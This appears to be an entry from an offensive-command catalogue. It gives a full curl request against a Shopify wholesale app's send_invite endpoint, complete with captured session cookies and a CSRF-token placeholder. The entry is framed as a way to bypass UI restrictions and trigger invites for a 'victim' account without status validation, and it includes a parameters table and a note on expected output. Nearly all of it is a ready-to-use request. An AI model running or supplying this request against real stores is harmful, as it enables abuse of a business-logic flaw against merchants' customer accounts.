---
data: >-
  curl -X POST
  'https://wholesale.shopifyapps.com/admin/shops/19596/accounts/{ID_ACCOUNT}/send_invite'
  -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie:
  _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; ...' -d
  'authenticity_token={AUTHENTICITY_TOKEN}'
tags:
  - shopify
  - api
  - bypass
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.643Z'
id: 39bb8845-b1f1-404a-9a34-9870587effa8
verified: false
validated: true
submitted: true
---
# shopify-send-invite-post

## Command

```bash
curl -X POST 'https://wholesale.shopifyapps.com/admin/shops/19596/accounts/{ID_ACCOUNT}/send_invite' \
  -H 'Host: wholesale.shopifyapps.com' \
  -H 'Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _shopify_y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _ga=GA1.2.tHExgAAT11NXuhaT9YUE8g%253D%253D; _session_id=fc5f618342a1e6b09a1b0dd8f663c815; shopify_domain=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkluTmpjbWx3ZEMxemNtTXRhSFIwY0hNdGFIbGtjbUY0WVc1dmJpMTRjM010YUhRdGMyTnlhWEIwTG0xNWMyaHZjR2xtZVM1amIyMGkiLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5zaG9waWZ5X2RvbWFpbiJ9fQ%3D%3D--0638dd0f382c4106ac4bc036aef29aff573e7e4f; _gid=GA1.2.1173666896.1626524371; _s=b49fbdf4-ACD4-4EC3-2C95-5B9FC0AB0372; _shopify_s=b49fbdf4-ACD4-4EC3-2C95-5B9FC0AB0372; _gat=1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182518?hmac=adf5598e786b95e73d4c6637a457ea38a01f7fb99a14b480c7fbe9c22e53ef80&host=c2NyaXB0LXNyYy1odHRwcy1oeWRyYXhhbm9uLXhzcy1odC1zY3JpcHQubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-US&session=6200a0935dc41a7c47776049d06e4b7f513d5b4622342e2851aeb5fc8f2f9f75&shop=script-src-https-hydraxanon-xss-ht-script.myshopify.com&timestamp=1626529478' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: https://wholesale.shopifyapps.com' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Sec-Fetch-Dest: iframe' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Te: trailers' \
  -H 'Connection: close' \
  --data-raw 'authenticity_token={AUTHENTICITY_TOKEN}'
```

## Description

Sends a POST request to the Shopify wholesale send_invite endpoint to bypass UI restrictions and prepare an invitation for an active customer account. Use this after identifying a target account ID to trigger backend invite logic without status validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{ID_ACCOUNT}` | Victim's wholesale account ID (e.g., 5182518) | Yes |
| `{AUTHENTICITY_TOKEN}` | CSRF token from intercepted UI request | Yes |
| Cookies | Full session cookies from staff login | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182518/send_invite' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: [full cookies]' --data-raw 'authenticity_token=[token]'
```

### Advanced Usage

Include full headers as shown in command for production-like simulation.

## Expected Output

HTTP 200 OK or 302 redirect, indicating successful invite preparation (e.g., no error body for enabled accounts).

## Related

- [[commands/shopify-invite-links-post]]
- [[procedures/Bypass-UI-Restrictions-with-Send-Invite-API]]
